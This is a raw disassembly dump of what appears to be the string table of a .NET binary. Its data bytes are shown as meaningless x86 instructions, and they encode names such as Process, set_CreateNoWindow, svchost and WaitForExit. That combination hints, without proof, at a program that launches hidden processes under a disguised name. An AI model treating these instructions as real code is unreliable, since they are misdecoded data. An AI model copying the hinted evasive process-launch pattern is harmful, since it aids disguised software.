  40ad38:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad39:	6b 65 6e 52          	imul   $0x52,0x6e(%ebp),%esp
  40ad3d:	65 61                	gs popa
  40ad3f:	64 65 72 00          	fs gs jb 0x40ad43
  40ad43:	50                   	push   %eax
  40ad44:	4f                   	dec    %edi
  40ad45:	4c                   	dec    %esp
  40ad46:	49                   	dec    %ecx
  40ad47:	43                   	inc    %ebx
  40ad48:	59                   	pop    %ecx
  40ad49:	56                   	push   %esi
  40ad4a:	49                   	dec    %ecx
  40ad4b:	45                   	inc    %ebp
  40ad4c:	57                   	push   %edi
  40ad4d:	4c                   	dec    %esp
  40ad4e:	4f                   	dec    %edi
  40ad4f:	43                   	inc    %ebx
  40ad50:	41                   	inc    %ecx
  40ad51:	4c                   	dec    %esp
  40ad52:	49                   	dec    %ecx
  40ad53:	4e                   	dec    %esi
  40ad54:	46                   	inc    %esi
  40ad55:	4f                   	dec    %edi
  40ad56:	52                   	push   %edx
  40ad57:	4d                   	dec    %ebp
  40ad58:	41                   	inc    %ecx
  40ad59:	54                   	push   %esp
  40ad5a:	49                   	dec    %ecx
  40ad5b:	4f                   	dec    %edi
  40ad5c:	4e                   	dec    %esi
  40ad5d:	73 74                	jae    0x40add3
  40ad5f:	72 69                	jb     0x40adca
  40ad61:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad62:	67 42                	addr16 inc %edx
  40ad64:	75 69                	jne    0x40adcf
  40ad66:	6c                   	insb   (%dx),%es:(%edi)
  40ad67:	64 65 72 00          	fs gs jb 0x40ad6b
  40ad6b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad6c:	75 74                	jne    0x40ade2
  40ad6e:	70 75                	jo     0x40ade5
  40ad70:	74 46                	je     0x40adb8
  40ad72:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad73:	6c                   	insb   (%dx),%es:(%edi)
  40ad74:	64 65 72 00          	fs gs jb 0x40ad78
  40ad78:	73 65                	jae    0x40addf
  40ad7a:	74 49                	je     0x40adc5
  40ad7c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad7d:	70 75                	jo     0x40adf4
  40ad7f:	74 45                	je     0x40adc6
  40ad81:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad82:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40ad85:	69 6e 67 67 65 74 42 	imul   $0x42746567,0x67(%esi),%ebp
  40ad8c:	69 6e 64 65 72 00 67 	imul   $0x67007265,0x64(%esi),%ebp
  40ad93:	65 74 49             	gs je  0x40addf
  40ad96:	73 53                	jae    0x40adeb
  40ad98:	69 6e 67 6c 65 42 79 	imul   $0x7942656c,0x67(%esi),%ebp
  40ad9f:	74 65                	je     0x40ae06
  40ada1:	63 46 69             	arpl   %eax,0x69(%esi)
  40ada4:	6c                   	insb   (%dx),%es:(%edi)
  40ada5:	65 4e                	gs dec %esi
  40ada7:	61                   	popa
  40ada8:	6d                   	insl   (%dx),%es:(%edi)
  40ada9:	65 65 46             	gs gs inc %esi
  40adac:	69 78 65 64 42 75 66 	imul   $0x66754264,0x65(%eax),%edi
  40adb3:	66 65 72 00          	data16 gs jb 0x40adb7
  40adb7:	53                   	push   %ebx
  40adb8:	58                   	pop    %eax
  40adb9:	53                   	push   %ebx
  40adba:	49                   	dec    %ecx
  40adbb:	4e                   	dec    %esi
  40adbc:	53                   	push   %ebx
  40adbd:	54                   	push   %esp
  40adbe:	41                   	inc    %ecx
  40adbf:	4c                   	dec    %esp
  40adc0:	4c                   	dec    %esp
  40adc1:	52                   	push   %edx
  40adc2:	45                   	inc    %ebp
  40adc3:	46                   	inc    %esi
  40adc4:	45                   	inc    %ebp
  40adc5:	52                   	push   %edx
  40adc6:	45                   	inc    %ebp
  40adc7:	4e                   	dec    %esi
  40adc8:	43                   	inc    %ebx
  40adc9:	45                   	inc    %ebp
  40adca:	53                   	push   %ebx
  40adcb:	43                   	inc    %ebx
  40adcc:	48                   	dec    %eax
  40adcd:	45                   	inc    %ebp
  40adce:	4d                   	dec    %ebp
  40adcf:	45                   	inc    %ebp
  40add0:	53                   	push   %ebx
  40add1:	58                   	pop    %eax
  40add2:	53                   	push   %ebx
  40add3:	53                   	push   %ebx
  40add4:	54                   	push   %esp
  40add5:	52                   	push   %edx
  40add6:	4f                   	dec    %edi
  40add7:	4e                   	dec    %esi
  40add8:	47                   	inc    %edi
  40add9:	4e                   	dec    %esi
  40adda:	41                   	inc    %ecx
  40addb:	4d                   	dec    %ebp
  40addc:	45                   	inc    %ebp
  40addd:	53                   	push   %ebx
  40adde:	49                   	dec    %ecx
  40addf:	47                   	inc    %edi
  40ade0:	4e                   	dec    %esi
  40ade1:	45                   	inc    %ebp
  40ade2:	44                   	inc    %esp
  40ade3:	50                   	push   %eax
  40ade4:	52                   	push   %edx
  40ade5:	49                   	dec    %ecx
  40ade6:	56                   	push   %esi
  40ade7:	41                   	inc    %ecx
  40ade8:	54                   	push   %esp
  40ade9:	45                   	inc    %ebp
  40adea:	41                   	inc    %ecx
  40adeb:	53                   	push   %ebx
  40adec:	53                   	push   %ebx
  40aded:	45                   	inc    %ebp
  40adee:	4d                   	dec    %ebp
  40adef:	42                   	inc    %edx
  40adf0:	4c                   	dec    %esp
  40adf1:	59                   	pop    %ecx
  40adf2:	41                   	inc    %ecx
  40adf3:	6c                   	insb   (%dx),%es:(%edi)
  40adf4:	6c                   	insb   (%dx),%es:(%edi)
  40adf5:	6f                   	outsl  %ds:(%esi),(%dx)
  40adf6:	63 61 74             	arpl   %esp,0x74(%ecx)
  40adf9:	65 42                	gs inc %edx
  40adfb:	75 66                	jne    0x40ae63
  40adfd:	66 65 72 00          	data16 gs jb 0x40ae01
  40ae01:	57                   	push   %edi
  40ae02:	72 69                	jb     0x40ae6d
  40ae04:	74 65                	je     0x40ae6b
  40ae06:	41                   	inc    %ecx
  40ae07:	73 79                	jae    0x40ae82
  40ae09:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae0a:	63 49 6e             	arpl   %ecx,0x6e(%ecx)
  40ae0d:	74 65                	je     0x40ae74
  40ae0f:	72 6e                	jb     0x40ae7f
  40ae11:	61                   	popa
  40ae12:	6c                   	insb   (%dx),%es:(%edi)
  40ae13:	64 43                	fs inc %ebx
  40ae15:	6c                   	insb   (%dx),%es:(%edi)
  40ae16:	61                   	popa
  40ae17:	73 73                	jae    0x40ae8c
  40ae19:	50                   	push   %eax
  40ae1a:	72 6f                	jb     0x40ae8b
  40ae1c:	70 65                	jo     0x40ae83
  40ae1e:	72 74                	jb     0x40ae94
  40ae20:	79 57                	jns    0x40ae79
  40ae22:	72 69                	jb     0x40ae8d
  40ae24:	74 65                	je     0x40ae8b
  40ae26:	72 00                	jb     0x40ae28
  40ae28:	73 65                	jae    0x40ae8f
  40ae2a:	74 5f                	je     0x40ae8b
  40ae2c:	52                   	push   %edx
  40ae2d:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  40ae34:	53 74 
  40ae36:	61                   	popa
  40ae37:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae38:	64 61                	fs popa
  40ae3a:	72 64                	jb     0x40aea0
  40ae3c:	45                   	inc    %ebp
  40ae3d:	72 72                	jb     0x40aeb1
  40ae3f:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae40:	72 00                	jb     0x40ae42
  40ae42:	67 65 74 41          	addr16 gs je 0x40ae87
  40ae46:	72 67                	jb     0x40aeaf
  40ae48:	75 6d                	jne    0x40aeb7
  40ae4a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40ae4c:	74 73                	je     0x40aec1
  40ae4e:	49                   	dec    %ecx
  40ae4f:	73 45                	jae    0x40ae96
  40ae51:	72 72                	jb     0x40aec5
  40ae53:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae54:	72 00                	jb     0x40ae56
  40ae56:	67 65 74 56          	addr16 gs je 0x40aeb0
  40ae5a:	65 72 73             	gs jb  0x40aed0
  40ae5d:	69 6f 6e 52 65 73 6f 	imul   $0x6f736552,0x6e(%edi),%ebp
  40ae64:	75 72                	jne    0x40aed8
  40ae66:	63 65 4d             	arpl   %esp,0x4d(%ebp)
  40ae69:	61                   	popa
  40ae6a:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae6b:	61                   	popa
  40ae6c:	67 65 72 4d          	addr16 gs jb 0x40aebd
  40ae70:	65 64 69 61 74 6f 72 	gs imul $0x2e00726f,%fs:0x74(%ecx),%esp
  40ae77:	00 2e 
  40ae79:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  40ae7d:	00 2e                	add    %ch,(%esi)
  40ae7f:	63 63 74             	arpl   %esp,0x74(%ebx)
  40ae82:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae83:	72 00                	jb     0x40ae85
  40ae85:	63 46 69             	arpl   %eax,0x69(%esi)
  40ae88:	6c                   	insb   (%dx),%es:(%edi)
  40ae89:	65 4e                	gs dec %esi
  40ae8b:	61                   	popa
  40ae8c:	6d                   	insl   (%dx),%es:(%edi)
  40ae8d:	65 65 46             	gs gs inc %esi
  40ae90:	69 78 65 64 42 75 66 	imul   $0x66754264,0x65(%eax),%edi
  40ae97:	66 65 72 46          	data16 gs jb 0x40aee1
  40ae9b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae9c:	50                   	push   %eax
  40ae9d:	74 72                	je     0x40af11
  40ae9f:	00 49 6e             	add    %cl,0x6e(%ecx)
  40aea2:	74 50                	je     0x40aef4
  40aea4:	74 72                	je     0x40af18
  40aea6:	00 53 79             	add    %dl,0x79(%ebx)
  40aea9:	73 74                	jae    0x40af1f
  40aeab:	65 6d                	gs insl (%dx),%es:(%edi)
  40aead:	2e 44                	cs inc %esp
  40aeaf:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40aeb6:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  40aebd:	74 65                	je     0x40af24
  40aebf:	6d                   	insl   (%dx),%es:(%edi)
  40aec0:	2e 52                	cs push %edx
  40aec2:	75 6e                	jne    0x40af32
  40aec4:	74 69                	je     0x40af2f
  40aec6:	6d                   	insl   (%dx),%es:(%edi)
  40aec7:	65 2e 49             	gs cs dec %ecx
  40aeca:	6e                   	outsb  %ds:(%esi),(%dx)
  40aecb:	74 65                	je     0x40af32
  40aecd:	72 6f                	jb     0x40af3e
  40aecf:	70 53                	jo     0x40af24
  40aed1:	65 72 76             	gs jb  0x40af4a
  40aed4:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40aedb:	73 74                	jae    0x40af51
  40aedd:	65 6d                	gs insl (%dx),%es:(%edi)
  40aedf:	2e 52                	cs push %edx
  40aee1:	75 6e                	jne    0x40af51
  40aee3:	74 69                	je     0x40af4e
  40aee5:	6d                   	insl   (%dx),%es:(%edi)
  40aee6:	65 2e 43             	gs cs inc %ebx
  40aee9:	6f                   	outsl  %ds:(%esi),(%dx)
  40aeea:	6d                   	insl   (%dx),%es:(%edi)
  40aeeb:	70 69                	jo     0x40af56
  40aeed:	6c                   	insb   (%dx),%es:(%edi)
  40aeee:	65 72 53             	gs jb  0x40af44
  40aef1:	65 72 76             	gs jb  0x40af6a
  40aef4:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  40aefb:	62 75 67             	bound  %esi,0x67(%ebp)
  40aefe:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  40af05:	65 
  40af06:	73 00                	jae    0x40af08
  40af08:	53                   	push   %ebx
  40af09:	65 74 46             	gs je  0x40af52
  40af0c:	6c                   	insb   (%dx),%es:(%edi)
  40af0d:	61                   	popa
  40af0e:	67 73 45             	addr16 jae 0x40af56
  40af11:	6e                   	outsb  %ds:(%esi),(%dx)
  40af12:	75 6d                	jne    0x40af81
  40af14:	4e                   	dec    %esi
  40af15:	65 73 74             	gs jae 0x40af8c
  40af18:	65 64 54             	gs fs push %esp
  40af1b:	79 70                	jns    0x40af8d
  40af1d:	65 73 00             	gs jae 0x40af20
  40af20:	45                   	inc    %ebp
  40af21:	6e                   	outsb  %ds:(%esi),(%dx)
  40af22:	61                   	popa
  40af23:	62 6c 65 45          	bound  %ebp,0x45(%ebp,%eiz,2)
  40af27:	76 65                	jbe    0x40af8e
  40af29:	6e                   	outsb  %ds:(%esi),(%dx)
  40af2a:	74 4e                	je     0x40af7a
  40af2c:	65 73 74             	gs jae 0x40afa3
  40af2f:	65 64 53             	gs fs push %ebx
  40af32:	74 72                	je     0x40afa6
  40af34:	69 6e 67 73 00 61 72 	imul   $0x72610073,0x67(%esi),%ebp
  40af3b:	67 73 00             	addr16 jae 0x40af3e
  40af3e:	67 65 74 5f          	addr16 gs je 0x40afa1
  40af42:	54                   	push   %esp
  40af43:	69 63 6b 73 00 47 65 	imul   $0x65470073,0x6b(%ebx),%esp
  40af4a:	74 4d                	je     0x40af99
  40af4c:	65 74 68             	gs je  0x40afb7
  40af4f:	6f                   	outsl  %ds:(%esi),(%dx)
  40af50:	64 42                	fs inc %edx
  40af52:	61                   	popa
  40af53:	73 65                	jae    0x40afba
  40af55:	4f                   	dec    %edi
  40af56:	70 65                	jo     0x40afbd
  40af58:	72 61                	jb     0x40afbb
  40af5a:	74 69                	je     0x40afc5
  40af5c:	6f                   	outsl  %ds:(%esi),(%dx)
  40af5d:	6e                   	outsb  %ds:(%esi),(%dx)
  40af5e:	73 00                	jae    0x40af60
  40af60:	53                   	push   %ebx
  40af61:	74 6f                	je     0x40afd2
  40af63:	72 65                	jb     0x40afca
  40af65:	41                   	inc    %ecx
  40af66:	6e                   	outsb  %ds:(%esi),(%dx)
  40af67:	64 44                	fs inc %esp
  40af69:	69 73 70 61 74 63 68 	imul   $0x68637461,0x70(%ebx),%esi
  40af70:	50                   	push   %eax
  40af71:	72 65                	jb     0x40afd8
  40af73:	76 65                	jbe    0x40afda
  40af75:	6e                   	outsb  %ds:(%esi),(%dx)
  40af76:	74 43                	je     0x40afbb
  40af78:	6c                   	insb   (%dx),%es:(%edi)
  40af79:	61                   	popa
  40af7a:	73 73                	jae    0x40afef
  40af7c:	4d                   	dec    %ebp
  40af7d:	65 6d                	gs insl (%dx),%es:(%edi)
  40af7f:	62 65 72             	bound  %esp,0x72(%ebp)
  40af82:	73 00                	jae    0x40af84
  40af84:	54                   	push   %esp
  40af85:	61                   	popa
  40af86:	6e                   	outsb  %ds:(%esi),(%dx)
  40af87:	47                   	inc    %edi
  40af88:	65 74 48             	gs je  0x40afd3
  40af8b:	65 61                	gs popa
  40af8d:	64 65 72 73          	fs gs jb 0x40b004
  40af91:	00 50 72             	add    %dl,0x72(%eax)
  40af94:	6f                   	outsl  %ds:(%esi),(%dx)
  40af95:	63 65 73             	arpl   %esp,0x73(%ebp)
  40af98:	73 00                	jae    0x40af9a
  40af9a:	73 65                	jae    0x40b001
  40af9c:	74 5f                	je     0x40affd
  40af9e:	41                   	inc    %ecx
  40af9f:	72 67                	jb     0x40b008
  40afa1:	75 6d                	jne    0x40b010
  40afa3:	65 6e                	outsb  %gs:(%esi),(%dx)
  40afa5:	74 73                	je     0x40b01a
  40afa7:	00 45 78             	add    %al,0x78(%ebp)
  40afaa:	69 73 74 73 00 43 6f 	imul   $0x6f430073,0x74(%ebx),%esi
  40afb1:	6e                   	outsb  %ds:(%esi),(%dx)
  40afb2:	63 61 74             	arpl   %esp,0x74(%ecx)
  40afb5:	00 4f 62             	add    %cl,0x62(%edi)
  40afb8:	6a 65                	push   $0x65
  40afba:	63 74 00 47          	arpl   %esi,0x47(%eax,%eax,1)
  40afbe:	65 74 44             	gs je  0x40b005
  40afc1:	65 73 65             	gs jae 0x40b029
  40afc4:	72 69                	jb     0x40b02f
  40afc6:	61                   	popa
  40afc7:	6c                   	insb   (%dx),%es:(%edi)
  40afc8:	69 7a 65 64 54 69 6d 	imul   $0x6d695464,0x65(%edx),%edi
  40afcf:	65 5a                	gs pop %edx
  40afd1:	6f                   	outsl  %ds:(%esi),(%dx)
  40afd2:	6e                   	outsb  %ds:(%esi),(%dx)
  40afd3:	65 49                	gs dec %ecx
  40afd5:	6e                   	outsb  %ds:(%esi),(%dx)
  40afd6:	66 6f                	outsw  %ds:(%esi),(%dx)
  40afd8:	67 65 74 4d          	addr16 gs je 0x40b029
  40afdc:	61                   	popa
  40afdd:	78 69                	js     0x40b048
  40afdf:	6d                   	insl   (%dx),%es:(%edi)
  40afe0:	75 6d                	jne    0x40b04f
  40afe2:	41                   	inc    %ecx
  40afe3:	67 65 55             	addr16 gs push %ebp
  40afe6:	6e                   	outsb  %ds:(%esi),(%dx)
  40afe7:	69 74 00 57 61 69 74 	imul   $0x46746961,0x57(%eax,%eax,1),%esi
  40afee:	46 
  40afef:	6f                   	outsl  %ds:(%esi),(%dx)
  40aff0:	72 45                	jb     0x40b037
  40aff2:	78 69                	js     0x40b05d
  40aff4:	74 00                	je     0x40aff6
  40aff6:	57                   	push   %edi
  40aff7:	68 69 74 65 73       	push   $0x73657469
  40affc:	70 61                	jo     0x40b05f
  40affe:	63 65 47             	arpl   %esp,0x47(%ebp)
  40b001:	65 74 49             	gs je  0x40b04d
  40b004:	6e                   	outsb  %ds:(%esi),(%dx)
  40b005:	74 65                	je     0x40b06c
  40b007:	72 6f                	jb     0x40b078
  40b009:	70 54                	jo     0x40b05f
  40b00b:	79 70                	jns    0x40b07d
  40b00d:	65 46                	gs inc %esi
  40b00f:	72 6f                	jb     0x40b080
  40b011:	6d                   	insl   (%dx),%es:(%edi)
  40b012:	58                   	pop    %eax
  40b013:	6d                   	insl   (%dx),%es:(%edi)
  40b014:	6c                   	insb   (%dx),%es:(%edi)
  40b015:	45                   	inc    %ebp
  40b016:	6c                   	insb   (%dx),%es:(%edi)
  40b017:	65 6d                	gs insl (%dx),%es:(%edi)
  40b019:	65 6e                	outsb  %gs:(%esi),(%dx)
  40b01b:	74 00                	je     0x40b01d
  40b01d:	45                   	inc    %ebp
  40b01e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b01f:	76 69                	jbe    0x40b08a
  40b021:	72 6f                	jb     0x40b092
  40b023:	6e                   	outsb  %ds:(%esi),(%dx)
  40b024:	6d                   	insl   (%dx),%es:(%edi)
  40b025:	65 6e                	outsb  %gs:(%esi),(%dx)
  40b027:	74 00                	je     0x40b029
  40b029:	43                   	inc    %ebx
  40b02a:	68 61 72 53 65       	push   $0x65537261
  40b02f:	74 55                	je     0x40b086
  40b031:	6e                   	outsb  %ds:(%esi),(%dx)
  40b032:	69 63 6f 64 65 4e 6f 	imul   $0x6f4e6564,0x6f(%ebx),%esp
  40b039:	74 69                	je     0x40b0a4
  40b03b:	66 79 45             	data16 jns 0x40b083
  40b03e:	76 65                	jbe    0x40b0a5
  40b040:	6e                   	outsb  %ds:(%esi),(%dx)
  40b041:	74 00                	je     0x40b043
  40b043:	53                   	push   %ebx
  40b044:	74 61                	je     0x40b0a7
  40b046:	72 74                	jb     0x40b0bc
  40b048:	00 46 61             	add    %al,0x61(%esi)
  40b04b:	69 6c 46 61 73 74 00 	imul   $0x73007473,0x61(%esi,%eax,2),%ebp
  40b052:	73 
  40b053:	76 63                	jbe    0x40b0b8
  40b055:	68 6f 73 74 00       	push   $0x74736f
  40b05a:	73 65                	jae    0x40b0c1
  40b05c:	74 5f                	je     0x40b0bd
  40b05e:	52                   	push   %edx
  40b05f:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  40b066:	53 74 
  40b068:	61                   	popa
  40b069:	6e                   	outsb  %ds:(%esi),(%dx)
  40b06a:	64 61                	fs popa
  40b06c:	72 64                	jb     0x40b0d2
  40b06e:	4f                   	dec    %edi
  40b06f:	75 74                	jne    0x40b0e5
  40b071:	70 75                	jo     0x40b0e8
  40b073:	74 00                	je     0x40b075
  40b075:	67 65 74 5f          	addr16 gs je 0x40b0d8
  40b079:	55                   	push   %ebp
  40b07a:	74 63                	je     0x40b0df
  40b07c:	4e                   	dec    %esi
  40b07d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b07e:	77 00                	ja     0x40b080
  40b080:	73 65                	jae    0x40b0e7
  40b082:	74 5f                	je     0x40b0e3
  40b084:	43                   	inc    %ebx
  40b085:	72 65                	jb     0x40b0ec
  40b087:	61                   	popa
  40b088:	74 65                	je     0x40b0ef
  40b08a:	4e                   	dec    %esi
  40b08b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b08c:	57                   	push   %edi
  40b08d:	69 6e 64 6f 77 00 44 	imul   $0x4400776f,0x64(%esi),%ebp
  40b094:	65 66 69 6e 65 42 79 	imul   $0x7942,%gs:0x65(%esi),%bp
  40b09b:	56                   	push   %esi
  40b09c:	61                   	popa
  40b09d:	6c                   	insb   (%dx),%es:(%edi)
  40b09e:	54                   	push   %esp
  40b09f:	53                   	push   %ebx
  40b0a0:	74 72                	je     0x40b114
  40b0a2:	54                   	push   %esp
  40b0a3:	68 75 72 73 64       	push   $0x64737275
  40b0a8:	61                   	popa
  40b0a9:	79 00                	jns    0x40b0ab
  40b0ab:	43                   	inc    %ebx
  40b0ac:	72 65                	jb     0x40b113
  40b0ae:	61                   	popa
  40b0af:	74 65                	je     0x40b116
  40b0b1:	44                   	inc    %esp
  40b0b2:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40b0b9:	79 00                	jns    0x40b0bb
  40b0bb:	44                   	inc    %esp
  40b0bc:	61                   	popa
  40b0bd:	73 68                	jae    0x40b127
  40b0bf:	50                   	push   %eax
  40b0c0:	75 6e                	jne    0x40b130
  40b0c2:	63 74 75 61          	arpl   %esi,0x61(%ebp,%esi,2)
  40b0c6:	74 69                	je     0x40b131
  40b0c8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0c9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0ca:	50                   	push   %eax
  40b0cb:	72 65                	jb     0x40b132
  40b0cd:	4c                   	dec    %esp
  40b0ce:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0cf:	61                   	popa
  40b0d0:	64 45                	fs inc %ebp
  40b0d2:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0d3:	74 72                	je     0x40b147
  40b0d5:	79 00                	jns    0x40b0d7
  40b0d7:	67 65 74 4d          	addr16 gs je 0x40b128
  40b0db:	61                   	popa
  40b0dc:	78 47                	js     0x40b125
  40b0de:	65 6e                	outsb  %gs:(%esi),(%dx)
  40b0e0:	65 72 61             	gs jb  0x40b144
  40b0e3:	74 69                	je     0x40b14e
  40b0e5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0e6:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0e7:	43                   	inc    %ebx
  40b0e8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0e9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0ea:	74 65                	je     0x40b151
  40b0ec:	78 74                	js     0x40b162
  40b0ee:	50                   	push   %eax
  40b0ef:	72 6f                	jb     0x40b160
  40b0f1:	70 65                	jo     0x40b158
  40b0f3:	72 74                	jb     0x40b169
  40b0f5:	79 00                	jns    0x40b0f7
  40b0f7:	00 5d 8d             	add    %bl,-0x73(%ebp)
  40b0fa:	6b 27 c0             	imul   $0xffffffc0,(%edi),%esp
  40b0fd:	53                   	push   %ebx
  40b0fe:	c6 42 bd ca          	movb   $0xca,-0x43(%edx)
  40b102:	7a 61                	jp     0x40b165
  40b104:	c6                   	(bad)
  40b105:	50                   	push   %eax
  40b106:	63 19                	arpl   %ebx,(%ecx)
  40b108:	00 08                	add    %cl,(%eax)
  40b10a:	b7 7a                	mov    $0x7a,%bh
  40b10c:	5c                   	pop    %esp
  40b10d:	56                   	push   %esi
  40b10e:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40b111:	89 02                	mov    %eax,(%edx)
  40b113:	06                   	push   %es
  40b114:	05 03 06 11 05       	add    $0x5110603,%eax
  40b119:	03 06                	add    (%esi),%eax
  40b11b:	1d 18 1c 07 10       	sbb    $0x10071c18,%eax
  40b120:	1d 08 0f 05 1d       	sbb    $0x1d050f08,%eax
  40b125:	1c 08                	sbb    $0x8,%al
  40b127:	08 1d 0a 0f 05 45    	or     %bl,0x45050f0a
  40b12d:	1d 0a 1d 1c 08       	sbb    $0x81c1d0a,%eax
  40b132:	0f 05                	syscall
  40b134:	05 08 08 1d 05       	add    $0x51d0808,%eax
  40b139:	08 04 00             	or     %al,(%eax,%eax,1)
  40b13c:	00 11                	add    %dl,(%ecx)
  40b13e:	05 09 00 03 10       	add    $0x10030009,%eax
  40b143:	11 05 1c 18 1d 1c    	adc    %eax,0x1c1d181c
  40b149:	06                   	push   %es
  40b14a:	00 01                	add    %al,(%ecx)
  40b14c:	0a 10                	or     (%eax),%dl
  40b14e:	11 05 02 1d 1c 09    	adc    %eax,0x91c1d02
  40b154:	00 03                	add    %al,(%ebx)
  40b156:	10 11                	adc    %dl,(%ecx)
  40b158:	0c 1c                	or     $0x1c,%al
  40b15a:	18 1d 1c 02 1d 03    	sbb    %bl,0x31d021c
  40b160:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40b165:	03 04 00             	add    (%eax,%eax,1),%eax
  40b168:	01 01                	add    %eax,(%ecx)
  40b16a:	0e                   	push   %cs
  40b16b:	09 00                	or     %eax,(%eax)
  40b16d:	03 10                	add    (%eax),%edx
  40b16f:	11 10                	adc    %edx,(%eax)
  40b171:	1c 18                	sbb    $0x18,%al
  40b173:	1d 1c 05 00 01       	sbb    $0x100051c,%eax
  40b178:	12 21                	adc    (%ecx),%ah
  40b17a:	0e                   	push   %cs
  40b17b:	03 00                	add    (%eax),%eax
  40b17d:	00 01                	add    %al,(%ecx)
  40b17f:	03 20                	add    (%eax),%esp
  40b181:	00 0a                	add    %cl,(%edx)
  40b183:	05 20 01 01 1d       	add    $0x1d010120,%eax
  40b188:	03 04 20             	add    (%eax,%eiz,1),%eax
  40b18b:	01 01                	add    %eax,(%ecx)
  40b18d:	0e                   	push   %cs
  40b18e:	04 07                	add    $0x7,%al
  40b190:	02 02                	add    (%edx),%al
  40b192:	08 04 00             	or     %al,(%eax,%eax,1)
  40b195:	01 02                	add    %eax,(%edx)
  40b197:	0e                   	push   %cs
  40b198:	1c 00                	sbb    $0x0,%al
  40b19a:	0d 01 10 08 10       	or     $0x10081001,%eax
  40b19f:	08 10                	or     %dl,(%eax)
  40b1a1:	08 12                	or     %dl,(%edx)
  40b1a3:	21 10                	and    %edx,(%eax)
  40b1a5:	02 10                	add    (%eax),%dl
  40b1a7:	1c 10                	sbb    $0x10,%al
  40b1a9:	02 10                	add    (%eax),%dl
  40b1ab:	0e                   	push   %cs
  40b1ac:	10 12                	adc    %dl,(%edx)
  40b1ae:	35 10 12 39 0e       	xor    $0xe391210,%eax
  40b1b3:	0e                   	push   %cs
  40b1b4:	0e                   	push   %cs
  40b1b5:	17                   	pop    %ss
  40b1b6:	00 0a                	add    %cl,(%edx)
  40b1b8:	08 10                	or     %dl,(%eax)
  40b1ba:	08 10                	or     %dl,(%eax)
  40b1bc:	08 10                	or     %dl,(%eax)
  40b1be:	08 12                	or     %dl,(%edx)
  40b1c0:	21 10                	and    %edx,(%eax)
  40b1c2:	0e                   	push   %cs
  40b1c3:	10 1c 10             	adc    %bl,(%eax,%edx,1)
  40b1c6:	0e                   	push   %cs
  40b1c7:	10 0e                	adc    %cl,(%esi)
  40b1c9:	10 0e                	adc    %cl,(%esi)
  40b1cb:	10 08                	adc    %cl,(%eax)
  40b1cd:	03 20                	add    (%eax),%esp
  40b1cf:	00 01                	add    %al,(%ecx)
  40b1d1:	0b 00                	or     (%eax),%eax
  40b1d3:	04 01                	add    $0x1,%al
  40b1d5:	10 08                	adc    %cl,(%eax)
  40b1d7:	10 08                	adc    %cl,(%eax)
  40b1d9:	10 08                	adc    %cl,(%eax)
  40b1db:	12 08                	adc    (%eax),%cl
  40b1dd:	08 07                	or     %al,(%edi)
  40b1df:	06                   	push   %es
  40b1e0:	0e                   	push   %cs
  40b1e1:	1c 0e                	sbb    $0xe,%al
  40b1e3:	0e                   	push   %cs
  40b1e4:	0e                   	push   %cs
  40b1e5:	08 03                	or     %al,(%ebx)
  40b1e7:	00 00                	add    %al,(%eax)
  40b1e9:	0e                   	push   %cs
  40b1ea:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40b1ef:	0e                   	push   %cs
  40b1f0:	06                   	push   %es
  40b1f1:	00 03                	add    %al,(%ebx)
  40b1f3:	0e                   	push   %cs
  40b1f4:	0e                   	push   %cs
  40b1f5:	0e                   	push   %cs
  40b1f6:	0e                   	push   %cs
  40b1f7:	03 07                	add    (%edi),%eax
  40b1f9:	01 1c 03             	add    %ebx,(%ebx,%eax,1)
  40b1fc:	07                   	pop    %es
  40b1fd:	01 08                	add    %ecx,(%eax)
  40b1ff:	36 07                	ss pop %es
  40b201:	26 1d 11 45 1d 12    	es sbb $0x121d4511,%eax
  40b207:	49                   	dec    %ecx
  40b208:	0f 05                	syscall
  40b20a:	08 08                	or     %cl,(%eax)
  40b20c:	08 08                	or     %cl,(%eax)
  40b20e:	1d 1c 08 08 08       	sbb    $0x808081c,%eax
  40b213:	12 21                	adc    (%ecx),%ah
  40b215:	08 12                	or     %dl,(%edx)
  40b217:	21 1d 1c 08 08 08    	and    %ebx,0x808081c
  40b21d:	08 02                	or     %al,(%edx)
  40b21f:	1c 02                	sbb    $0x2,%al
  40b221:	0e                   	push   %cs
  40b222:	12 35 12 39 08 08    	adc    0x8083912,%dh
  40b228:	1d 1c 08 12 21       	sbb    $0x2112081c,%eax
  40b22d:	08 08                	or     %cl,(%eax)
  40b22f:	08 08                	or     %cl,(%eax)
